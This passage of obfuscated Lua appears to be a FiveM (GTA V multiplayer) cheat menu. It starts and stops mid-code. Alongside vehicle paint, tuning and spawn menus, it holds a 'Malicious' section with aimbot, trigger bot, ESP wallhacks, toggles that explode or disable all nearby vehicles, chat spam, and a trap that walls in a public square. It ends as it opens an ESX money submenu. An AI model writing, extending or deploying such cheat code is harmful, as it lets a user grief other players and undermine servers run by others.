                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) oldpearl, oldwheelcolour = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = waduyh487r64 elseif b8 and curprim == dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("metallic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) oldpearl, oldwheelcolour = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = waduyh487r64 elseif b8 and curprim == dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("matte1") then
                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) oldpearl, oldwheelcolour = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) b8 = waduyh487r64 elseif b8 and curprim == dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("metal1") then
                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) oldpearl, oldwheelcolour = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) b8 = waduyh487r64 elseif b8 and curprim == dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldsec) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dT.id, oldwheelcolour) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("classic2") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec) SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = waduyh487r64 elseif b8 and cursec == dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("metallic2") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec) SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = waduyh487r64 elseif b8 and cursec == dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("matte2") then
                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec) SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = waduyh487r64 elseif b8 and cursec == dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("metal2") then
                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec) SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = waduyh487r64 elseif b8 and cursec == dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldprim, dT.id) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("classic3") then
                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) oldpearl, oldwheelcolour = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = waduyh487r64 elseif b8 and currims == dT.id then SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("metallic3") then
                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) oldpearl, oldwheelcolour = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = waduyh487r64 elseif b8 and currims == dT.id then SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("matte3") then
                    for dS, dT in pairs(bi) do _, ts = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx; oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) oldpearl, oldwheelcolour = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = waduyh487r64 elseif b8 and currims == dT.id then SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = waduyh487r64 end end end; ililililil() elseif Plane.IsMenuOpened("metal3") then
                    for dS, dT in pairs(bj) do _, ts = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = KZjx
                     oldprim, oldsec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) oldpearl, oldwheelcolour = GetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv) 
                     b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) 
                     SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) 
                     b8 = waduyh487r64 elseif b8 and currims == dT.id then 
                        SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = KZjx; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, oldpearl, dT.id) b8 = waduyh487r64 end end end;
    
                    ililililil()
            elseif Plane.IsMenuOpened("\76\83\67\10") then
			local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(PlayerPedId())
					if LDOWJDWDdddwdwdad('~r~→  ~s~~y~Handling ~s~editor', '\72\101\100\105\116\10') then
		elseif LDOWJDWDdddwdwdad("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
        elseif LDOWJDWDdddwdwdad("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
                elseif IlIlIlI(
                    "Super Handling",
                    superGrip,
                    function(KAKAAKAKAK)
                        superGrip = KAKAAKAKAK
                        enchancedGrip = KZjx
                        driftMode = KZjx
                        fdMode = KZjx
                    end)
                then
                elseif IlIlIlI(
                    "Enhanced Grip",
                    enchancedGrip,
                    function(KAKAAKAKAK)
                        superGrip = KZjx
                        enchancedGrip = KAKAAKAKAK
                        driftMode = KZjx
                        fdMode = KZjx
                    end)
                then
                elseif IlIlIlI(
                    "Drift Mode",
                    driftMode,
                    function(KAKAAKAKAK)
                        superGrip = KZjx
                        enchancedGrip = KZjx
                        driftMode = KAKAAKAKAK
                        fdMode = KZjx
                    end)
                then
                elseif IlIlIlI(
                    "Formula Drift Mode",
                    fdMode,
                    function(KAKAAKAKAK)
                        superGrip = KZjx
                        enchancedGrip = KZjx
                        driftMode = KZjx
                        fdMode = KAKAAKAKAK
                    end)
                then
                elseif LDOWJDWDdddwdwdad("~r~→  ~s~Vehicle Boost", "\86\101\104\66\111\111\115\116\77\101\110\117\10") then
                elseif IlIlIlIlIlI("Max Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif IlIlIlIlIlI("Max Performance") then
                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                end

                ililililil()
		elseif Plane.IsMenuOpened("\72\101\100\105\116\10") then
		if GetVehiclePedIsIn( PlayerPedId(), KZjx ) ~= 0 then
						if IlIlIlIlIlI('Refresh Info') then
                            chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), KZjx ) ) 
							end
			for i,theKey in pairs(chdata) do
				if tonumber(theKey.value) then 
					theKey.value = math.floor(tonumber(theKey.value) * 10^(3) + 0.5) / 10^(3)
				end
				if type(theKey.value) == "vector3" then
					local v1,v2,v3 = table.unpack(theKey.value)
					theKey.value = v1..","..v2..","..v3
				end
				theKey.value = tostring(theKey.value)
				
				if theKey.value and IlIlIlIlIlI(theKey.name, theKey.value) then 
						
					
						
					AddTextEntry('FMMC_KEY_TIP12N', "Enter new "..theKey.name.." value :") 

					DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP12N", "", theKey.value, "", "", "", 128 + 1)
				
					while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
						Citizen.Wait( 0 )
					end
				
					local awd2323 = GetOnscreenKeyboardResult()
					if awd2323 then
					
						if theKey.type == "vector3" then
							local x,y,z = table.unpack( mysplit( awd2323, "," ) )
							if x and y and z then
								awd2323 = vector3(tonumber(x),tonumber(y),tonumber(z))
							else
								break
							end
						end
						
			
								
						SetVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(),KZjx), theKey.name, awd2323 ) 
						Wait(200)
						chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), KZjx ) )
					end
					
					
				end
			end
        else
		adyt23h23("You're not sitting in a vehicle IDIOT!")
			end
		ililililil()
            elseif Plane.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if LDOWJDWDdddwdwdad('~r~→  ~s~' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                ililililil()
            elseif Plane.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if LDOWJDWDdddwdwdad('~r~→  ~s~' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                ililililil()
            elseif Plane.IsMenuOpened('CarOptions') then
                if IlIlIlIlIlI('Spawn Infront Of You') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local vvvvvvvvvvvvvvvvvvvvvvvv = b4[carTypeIdx][carToSpawn]
                    if vvvvvvvvvvvvvvvvvvvvvvvv == WADUI then
                        vvvvvvvvvvvvvvvvvvvvvvvv = 'adder'
                    end
                    vehiclehash = Ggggg(vvvvvvvvvvvvvvvvvvvvvvvv)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, waduyh487r64)
                            SetVehicleEngineOn(SpawnedCar, waduyh487r64, waduyh487r64, KZjx)
                            SetVehicleEngineCanDegrade(SpawnedCar, KZjx)
                        end
                    )
				elseif IlIlIlIlIlI('Spawn In It') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local vvvvvvvvvvvvvvvvvvvvvvvv = b4[carTypeIdx][carToSpawn]
                    if vvvvvvvvvvvvvvvvvvvvvvvv == WADUI then
                        vvvvvvvvvvvvvvvvvvvvvvvv = 'adder'
                    end
                    vehiclehash = Ggggg(vvvvvvvvvvvvvvvvvvvvvvvv)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, waduyh487r64)
							SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
                            SetVehicleEngineOn(SpawnedCar, waduyh487r64, waduyh487r64, KZjx)
                            SetVehicleEngineCanDegrade(SpawnedCar, KZjx)
                        end
                    )
                end
                ililililil()
            elseif Plane.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), waduyh487r64) then
                    for i, ex in ipairs(b5) do
                        if LDOWJDWDdddwdwdad('~r~→  ~s~' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                    av('~h~~w~Not in a vehicle', waduyh487r64)
                end
                ililililil()
            elseif Plane.IsMenuOpened('MainTrailerSpa') then
                if IlIlIlIlIlI('Spawn Vehicle') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local vvvvvvvvvvvvvvvvvvvvvvvv = b5[TrailerToSpawn]
                    if vvvvvvvvvvvvvvvvvvvvvvvv == WADUI then
                        vvvvvvvvvvvvvvvvvvvvvvvv = 'adder'
                    end
                    vehiclehash = Ggggg(vvvvvvvvvvvvvvvvvvvvvvvv)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            local SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            local ez = GetVehiclePedIsUsing(GetPlayerPed(-1))
                            AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                            SetVehicleStrong(SpawnedCar, waduyh487r64)
                            SetVehicleEngineOn(SpawnedCar, waduyh487r64, waduyh487r64, KZjx)
                            SetVehicleEngineCanDegrade(SpawnedCar, KZjx)
                        end
                    )
                end
                ililililil()
            elseif Plane.IsMenuOpened("\86\101\104\66\111\111\115\116\77\101\110\117\10") then
                if IlIlIlIlIlI('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 1.0)
			elseif IlIlIlIlIlI('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 2.0 * 20.0)
			elseif IlIlIlIlIlI('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 4.0 * 20.0)
			elseif IlIlIlIlIlI('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 8.0 * 20.0)
			elseif IlIlIlIlIlI('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 16.0 * 20.0)
			elseif IlIlIlIlIlI('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 32.0 * 20.0)
			elseif IlIlIlIlIlI('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 64.0 * 20.0)
			elseif IlIlIlIlIlI('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 128.0 * 20.0)
			elseif IlIlIlIlIlI('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 512.0 * 20.0)
			elseif IlIlIlIlIlI('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 5012.0 * 20.0)
			end

                ililililil()
            elseif Plane.IsMenuOpened("\77\97\108\105\99\105\111\117\115\77\101\110\117\10") then
                if IlIlIlI(
                    "Crosshair",
                    crosshair,
                    function(KAKAAKAKAK)
                        crosshair = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                    "Crosshair 2",
                    crosshair2,
                    function(KAKAAKAKAK)
                         crosshair2 = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                    "Crosshair 3",
                    crosshair3,
                    function(KAKAAKAKAK)
                        crosshair3 = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                "~o~Thermal Vision",
                thermalVision,
                function(KAKAAKAKAK)
                    thermalVision = KAKAAKAKAK
                    SetSeethrough(thermalVision)
                end)
                then
				elseif IlIlIlI(
                "~p~Night Vision",
                nightVision,
                function(KAKAAKAKAK)
                    nightVision = KAKAAKAKAK
                    SetNightvision(nightVision)
                end)
                then
				elseif IlIlIlI(
				    "Christmas Weather",
					XMAS,
					function(KAKAAKAKAK)
					XMAS = KAKAAKAKAK
					end)
					then
				elseif IlIlIlI(
				    "Foggy Weather",
					FOGGY,
					function(KAKAAKAKAK)
					FOGGY = KAKAAKAKAK
					end)
					then
				elseif IlIlIlI(
				    "Clear Weather",
					CLEAR,
					function(KAKAAKAKAK)
					CLEAR = KAKAAKAKAK
					end)
					then
				elseif IlIlIlI(
				    "Blizzard Weather",
					BLIZZARD,
					function(KAKAAKAKAK)
					BLIZZARD = KAKAAKAKAK
					end)
					then
				elseif IlIlIlI(
				    "Extra Sunny Weather",
					EXTRASUNNY,
					function(KAKAAKAKAK)
					EXTRASUNNY = KAKAAKAKAK
					end)
					then
				elseif IlIlIlIlIlI("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif IlIlIlIlIlI("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
				elseif IlIlIlIlIlI("Wall-in Legion Square") then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, 258.91, -933.1, 26.21, waduyh487r64, waduyh487r64, KZjx)
                    local ea = CreateObject(e8, 200.91, -874.1, 26.21, waduyh487r64, waduyh487r64, KZjx)
					local e92 = CreateObject(e8, 126.52, -933.2, 26.21, waduyh487r64, waduyh487r64, KZjx)
					local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, waduyh487r64, waduyh487r64, KZjx)
                    SetEntityHeading(e9, 158.41)
                    SetEntityHeading(ea, 90.51)
					SetEntityHeading(e92, 332.41)
                    SetEntityHeading(ea2, 260.51)
                    FreezeEntityPosition(e9, waduyh487r64)
                    FreezeEntityPosition(ea, waduyh487r64)
					FreezeEntityPosition(e92, waduyh487r64)
                    FreezeEntityPosition(ea2, waduyh487r64)
                elseif IlIlIlI(
                    "AimBot",
                    LOJ38,
                    function(KAKAAKAKAK)
                        LOJ38 = KAKAAKAKAK
                    end)
                then
                elseif LDOWJDWDdddwdwdad('~r~→  ~s~ESP Menu', 'LulxDJ') then
				elseif IlIlIlI(
				"~g~EMP ~s~All Nearby Vehicles",
				destroyvehicles,
				function(KAKAAKAKAK)
				destroyvehicles = KAKAAKAKAK
				end) 
			then
				elseif IlIlIlI(
				"~r~Explode ~s~All Nearby Vehicles",
				explodevehicles,
				function(KAKAAKAKAK)
				explodevehicles = KAKAAKAKAK
				end) 
			then
                elseif IlIlIlI(
                    "Trigger Bot",
                    kdwojd,
                    function(KAKAAKAKAK)
                        kdwojd = KAKAAKAKAK
                    end)
                then
				 elseif
                    IlIlIlI(
                        'Chat Spam',
                        chatspam,
                        function(KAKAAKAKAK)
                            chatspam = KAKAAKAKAK
                        end
                    )
                 then

                end

                ililililil()
			elseif Plane.IsMenuOpened('LulxDJ') then
                if
                    IlIlIlI(
                        '~h~~r~ESP ~s~MasterSwitch',
                        NGEIFHDDN,
                        function(KAKAAKAKAK)
                            NGEIFHDDN = KAKAAKAKAK
                        end
                    )
                 then
                elseif
                    IlIlIlI(
                        '~h~~r~ESP ~s~Box',
                        jfjfjffuhguh,
                        function(KAKAAKAKAK)
                            jfjfjffuhguh = KAKAAKAKAK
                        end
                    )
                 then
                elseif
                    IlIlIlI(
                        '~h~~r~ESP ~s~Info',
                        KDOWJDw,
                        function(KAKAAKAKAK)
                            KDOWJDw = KAKAAKAKAK
                        end
                    )
                 then
                elseif
                    IlIlIlI(
                        '~h~~r~ESP ~s~Lines',
                        jfjfjf,
                        function(KAKAAKAKAK)
                            jfjfjf = KAKAAKAKAK
                        end
                    )
                 then
                end
                ililililil()
            elseif Plane.IsMenuOpened("\69\83\88\77\101\110\117\10") then
                if LDOWJDWDdddwdwdad("~r~→  ~s~ESX Money Options", "\69\83\88\77\111\110\101\121\77\101\110\117\10") then
